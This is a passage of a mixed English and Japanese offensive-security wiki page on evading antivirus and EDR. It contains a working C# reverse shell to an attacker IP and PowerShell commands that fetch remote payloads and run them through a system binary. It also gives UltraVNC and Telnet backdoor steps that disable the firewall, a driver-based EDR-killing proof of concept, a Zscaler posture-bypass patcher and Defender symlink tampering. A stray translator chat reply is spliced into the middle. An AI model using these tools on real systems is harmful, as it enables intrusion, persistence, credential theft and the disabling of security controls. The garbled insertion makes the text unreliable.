As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin without using the GUI).


## Advanced Evasion

Evasion は非常に複雑なトピックで、単一のシステムで複数の異なるテレメトリソースを考慮する必要があることが多く、成熟した環境で完全に検出を免れるのはほぼ不可能です。

攻撃対象となる環境ごとに強みと弱みは異なります。

より高度な Evasion 手法に触れるために、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは [@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の別の優れたトークです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**開始**し、今すぐ**実行**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portを変更**（ステルス）およびファイアウォールを無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin ダウンロードを利用し、setup ではないものを選んでください)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

その後、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **victim** の中に移動します

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告:** ステルスを維持するために、以下のことを行ってはいけません

- 既に実行中の場合は `winvnc` を起動しないこと。起動すると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。実行中かどうかは `tasklist | findstr winvnc` で確認してください
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないこと。起動すると [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプを表示するために `winvnc -h` を実行しないこと。実行すると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に **lister を起動** を `msfconsole -r file.rc` で行い、**実行** する **xml payload** は次のとおりです:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の defender はプロセスを非常に速く終了します。**

### 自前の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のようにコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
以下のように使用します:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# コンパイラを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
そのファイルの中身をこちらに貼っていただけますか？外部リンクやリポジトリから自動で取得することはできません。

翻訳のルール（確認のため）
- コード、コマンド、パス、リンク、タグ（例: {#tabs} や markdown/html タグ）は翻訳しません。
- 技術名（ハッキング手法、クラウド名、pentesting など）も翻訳しません。
- それ以外の英語テキストを日本語に翻訳して、元の markdown/html 構造はそのまま保持します。

ファイル内容を貼っていただければ、指示どおりに翻訳して返します。
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators の一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Pythonを使用したビルドインジェクターの例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR 無効化

Storm-2603 は小さなコンソールユーティリティである **Antivirus Terminator** を利用して、ランサムウェアを展開する前にエンドポイント保護を無効化しました。このツールは **独自の脆弱だが *signed* なドライバ** を持ち込み、それを悪用して Protected-Process-Light (PPL) な AV サービスでさえ阻止できない特権カーネル操作を実行します。

主なポイント
1. **Signed driver**: ディスクに配置されるファイル名は `ServiceMouse.sys` ですが、実体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft 署名を持つため、Driver-Signature-Enforcement (DSE) が有効でもロードされます。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目はドライバを **kernel service** として登録し、2 行目はそれを起動して `\\.\ServiceMouse` がユーザーランドからアクセス可能になるようにします。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD はユーザーモードの保護を完全に回避します。カーネルで実行されるコードは *protected* なプロセスを開いて終了させたり、PPL/PP、ELAM、その他の強化機能に関係なくカーネルオブジェクトを改変できます。

Detection / Mitigation
•  Microsoft の vulnerable-driver ブロックリスト（`HVCI`, `Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` のロードを拒否するようにする。  
•  新しい *kernel* サービスの作成を監視し、ワールドライト可能なディレクトリからロードされたドライバや許可リストにないドライバがロードされた場合にアラートを上げる。  
•  カスタムデバイスオブジェクトへのユーザーモードハンドル作成の後に疑わしい `DeviceIoControl` 呼び出しが行われていないか監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** はデバイスの posture ルールをローカルで適用し、結果を他コンポーネントに伝えるために Windows RPC を利用します。設計上の弱点が二つあり、完全なバイパスを可能にします：

1. Posture の評価が **完全にクライアント側で行われる**（サーバには boolean が送られるだけ）。  
2. 内部 RPC エンドポイントは接続する実行ファイルが **Zscaler によって署名されている** ことだけを検証する（`WinVerifyTrust` 経由）。

ディスク上の署名済みバイナリを四つパッチすることで、両方の仕組みを無効化できます：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後:

* **All** posture checks は **green/compliant** になります。
* 署名されていない、または改変されたバイナリが named-pipe RPC endpoints を開くことができる（例：`\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークに対して無制限のアクセスを得る。

このケーススタディは、純粋にクライアント側の信頼判断と単純な署名チェックが、わずかなバイトパッチで破られることを示しています。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改竄する

Protected Process Light (PPL) は、署名者/レベルの階層を強制し、同等かそれ以上の保護レベルを持つプロセスのみが互いに改竄できるようにします。攻撃的には、正当に PPL 対応バイナリを起動し引数を制御できる場合、ログ記録などの無害な機能を AV/EDR が使用する保護ディレクトリに対する制約付きの、PPL によって裏付けられた書き込みプリミティブに変換できます。

プロセスが PPL として実行される条件
- 対象の EXE（およびロードされる DLL）は PPL 対応の EKU で署名されている必要がある。
- プロセスは CreateProcess で以下のフラグを使用して作成される必要がある：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- バイナリの署名者に一致する互換性のある保護レベルを要求する必要がある（例：アンチマルウェア署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。不適切なレベルだと作成時に失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソース ヘルパー: CreateProcessAsPPL (保護レベルを選択し、引数をターゲット EXE に転送する)：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用パターン：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN プリミティブ: ClipUp.exe
- 署名されたシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け付けます。
- PPL プロセスとして起動されると、ファイル書き込みは PPL によって保護された状態で行われます。
- ClipUp は空白を含むパスを解析できません。通常保護された場所を指すには 8.3 短縮パスを使用してください。

8.3 短縮パスのヘルパー
- 短縮名を一覧表示: 各親ディレクトリで `dir /x`
- cmd で短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain（概要）
1) PPL 対応の LOLBIN (ClipUp) を、ランチャー（例: CreateProcessAsPPL）を使って `CREATE_PROTECTED_PROCESS` で起動する。
2) ClipUp のログパス引数を渡して、保護された AV ディレクトリ（例: Defender Platform）にファイル作成を強制する。必要なら 8.3 短縮名を使う。
3) 対象バイナリが通常 AV によって実行中にオープン/ロックされている場合（例: MsMpEng.exe）、AV 起動前のブート時に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールする。ブート順序は Process Monitor（boot logging）で検証する。
4) 再起動時に PPL による書き込みが AV がバイナリをロックする前に行われ、ターゲットファイルが破損して起動不能になる。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容は配置以外で制御できません。これは精密なコンテンツ注入よりも破損を目的としたプリミティブです。
- サービスのインストール/開始と再起動の機会にはローカル管理者権限/SYSTEM が必要です。
- タイミングが重要：対象が開かれていない必要があり、ブート時の実行はファイルロックを回避します。

Detections
- ブート前後に、非標準のランチャーを親に持ち、異常な引数で `ClipUp.exe` がプロセス生成されること。
- 疑わしいバイナリを自動起動するよう設定された新規サービス、かつ Defender/AV より前に常に起動するサービス。Defender の起動失敗の前にサービスの作成/変更を調査すること。
- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視。protected-process フラグを持つプロセスによる予期しないファイル作成/変更を確認する。
- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` で生成されたプロセスや、非 AV バイナリによる異常な PPL レベルの使用を監視する。

Mitigations
- WDAC/Code Integrity: どの署名済みバイナリが PPL として、またどの親プロセス下で実行できるかを制限する。正当なコンテキスト外での ClipUp の呼び出しをブロックする。
- サービスの管理: 自動起動サービスの作成/変更を制限し、起動順序の操作を監視する。
- Defender の改ざん防止と早期起動保護を有効にすること。バイナリの破損を示す起動エラーを調査する。
- セキュリティツールをホストするボリュームで 8.3 ショートネーム生成を無効化することを検討（環境と互換性がある場合、十分にテストすること）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- ローカル管理者（Platform フォルダ下でディレクトリ/シンボリックリンクを作成するために必要）
- 再起動または Defender プラットフォームの再選択をトリガーできること（ブート時のサービス再起動）
- ビルトインのツールのみ必要（mklink）

Why it works
- Defender は自身のフォルダへの書き込みをブロックしますが、プラットフォーム選択はディレクトリエントリを信用し、ターゲットが保護/信頼されたパスに解決されるかを検証せずに辞書順で最も大きいバージョンを選びます。

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダを指す上位バージョンのディレクトリへのシンボリックリンクを作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` に存在し、サービス設定/レジストリがその場所を反映していることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリからロードする DLL を Drop/replace して、Defender のプロセス内で code を実行します。詳細は上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink を削除すると、次回起動時に設定されたパスが解決されず、Defender が起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この手法自体では権限昇格を提供しないことに注意してください。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamsは、Import Address Table (IAT) をフックし、選択したAPIsを攻撃者が制御する position‑independent code (PIC) 経由でルーティングすることで、ランタイム回避をC2 implantの外からターゲットモジュール自身の内部へ移すことができます。これにより、多くのキットが露呈する小さなAPIサーフェス（例: CreateProcessA）を超えて回避策が一般化され、同じ保護がBOFsやpost‑exploitation DLLsにも拡張されます。

High-level approach
- reflective loader（prepended または companion）を使って、ターゲットモジュールの横にPIC blobをステージします。PICは自己完結型でposition‑independentでなければなりません。
- ホストDLLがロードされる際に、その IMAGE_IMPORT_DESCRIPTOR を走査して、対象のインポート（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）のIATエントリを薄いPICラッパーを指すようにパッチします。
- 各PICラッパーは実際のAPIアドレスにtail‑callingする前に回避処理を実行します。典型的な回避手法には次のようなものがあります:
  - 呼び出しの前後でメモリをマスク/アンマスクする（例: beacon regions を暗号化、RWX→RX、ページ名/権限の変更）そして呼び出し後に復元する。
  - Call‑stack spoofing: 悪意のないスタックを構築してターゲットAPIに移行し、call‑stack 分析が期待されるフレームに解決されるようにする。
  - 互換性のためにインターフェースをエクスポートし、Aggressor script（または同等のもの）が Beacon、BOFs、post‑ex DLLs に対してどのAPIをフックするかを登録できるようにします。

Why IAT hooking here
- フックされたインポートを使用する任意のコードに対して機能し、ツールのコードを修正したり Beacon に特定のAPIをプロキシさせたりする必要がありません。
- post‑ex DLLs をカバーします: LoadLibrary* をフックすることでモジュールロード（例: System.Management.Automation.dll, clr.dll）を傍受し、それらのAPI呼び出しに対して同じマスキング/スタック回避を適用できます。
- CreateProcessA/W をラップすることで、call‑stack–ベースの検知に対して process‑spawning な post‑ex コマンドの信頼できる利用を回復します。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- パッチは relocations/ASLR の適用後、インポートを最初に使用する前に適用すること。TitanLdr/AceLdr のような Reflective loaders は、ロードされたモジュールの DllMain 内でフックを行うことを示す。
- ラッパーは小さく PIC-safe に保つ；真の API はパッチ適用前に取得した元の IAT 値から解決するか、LdrGetProcedureAddress を使って解決する。
- PIC では RW → RX の遷移を使用し、writable+executable なページを残さないようにする。

Call‑stack spoofing stub
- Draugr‑style PIC スタブは偽のコールチェーン（良性モジュールへの戻りアドレス）を構築し、そこから実際の API へピボットする。
- これは Beacon/BOFs から敏感な API への標準的なスタックを期待する検出を回避する。
- API のプロローグ前に期待されるフレーム内に着地するため、stack cutting/stack stitching 技術と組み合わせて使用する。

Operational integration
- post‑ex DLL に reflective loader を先頭に付けることで、DLL がロードされた際に PIC とフックが自動的に初期化されるようにする。
- Aggressor スクリプトを使用してターゲット API を登録し、Beacon と BOFs がコード変更なしに同じ回避パスの恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT 整合性: 非イメージ（heap/anon）アドレスに解決されるエントリ；インポートポインタの定期的検証。
- スタック異常: ロードされたイメージに属さない戻りアドレス；非イメージ PIC への急な遷移；一貫性のない RtlUserThreadStart の系譜。
- ローダーのテレメトリ: プロセス内での IAT への書き込み、インポートサムを変更する早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
- イメージロード回避: LoadLibrary* をフックしている場合、memory masking イベントと相関する automation/clr アセンブリの不審なロードを監視する。

Related building blocks and examples
- ロード中に IAT パッチを行う Reflective loaders（例: TitanLdr, AceLdr）
- Memory masking hooks（例: simplehook）および stack‑cutting PIC（stackcutting）
- PIC コールスタック偽装スタブ（例: Draugr）

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer（aka BluelineStealer）は、現代の info-stealers が AV bypass、anti-analysis、credential access を単一のワークフローでどのように組み合わせるかを示している。

### Keyboard layout gating & sandbox delay

- 設定フラグ（`anti_cis`）は `GetKeyboardLayoutList` を使ってインストールされたキーボードレイアウトを列挙する。キリル文字レイアウトが見つかった場合、サンプルは空の `CIS` マーカーをドロップしてスティーラーを実行する前に終了し、除外されたロケールで決して起動しないようにしつつ、ハンティング用のアーティファクトを残す。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### レイヤー化された `check_antivm` ロジック

- Variant A はプロセス一覧を走査し、各名前をカスタムのローリングチェックサムでハッシュ化して debuggers/sandboxes の組み込みブロックリストと照合します。チェックサムをコンピューター名にも繰り返し適用し、`C:\analysis` のような作業ディレクトリも確認します。
- Variant B はシステムプロパティ（プロセス数の下限、最近の稼働時間）を検査し、OpenServiceA("VBoxGuest") を呼び出して VirtualBox additions を検出し、sleep 周りで timing checks を行って single-stepping を見つけます。いずれかがヒットした場合はモジュール起動前に中止します。

### Fileless helper + double ChaCha20 reflective loading

- プライマリ DLL/EXE は Chromium credential helper を埋め込んでおり、ディスクにドロップされるか手動で in-memory にマップされます。fileless モードでは imports/relocations を自分で解決するため、ヘルパーのアーティファクトは書き込まれません。
- そのヘルパーは二重に ChaCha20（32バイト鍵×2＋12バイト nonce）で暗号化されたセカンドステージ DLL を格納します。両パス終了後、blob を reflectively loads（`LoadLibrary` は使用せず）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来するエクスポート `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。
- ChromElevator ルーチンは direct-syscall reflective process hollowing を使用して稼働中の Chromium ブラウザへ注入し、AppBound Encryption keys を継承して、ABE hardening があっても SQLite データベースからパスワード/クッキー/クレジットカードを直接復号します。


### モジュール式 in-memory 収集 & chunked HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインターテーブルを反復し、有効なモジュール（Telegram、Discord、Steam、スクリーンショット、ドキュメント、ブラウザ拡張など）ごとにスレッドを立ち上げます。各スレッドは共有バッファに結果を書き込み、約45秒の join ウィンドウ後にファイル数を報告します。
- 完了後、すべては静的リンクされた `miniz` ライブラリで `%TEMP%\\Log.zip` として圧縮されます。`ThreadPayload1` は 15s スリープし、アーカイブを 10 MB チャンクで HTTP POST によって `http://<C2>:6767/upload` へストリーミングし、ブラウザの `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装します。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が付与され、最後のチャンクは `complete: true` を追加して C2 が再構築完了を認識します。

## 参考文献

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
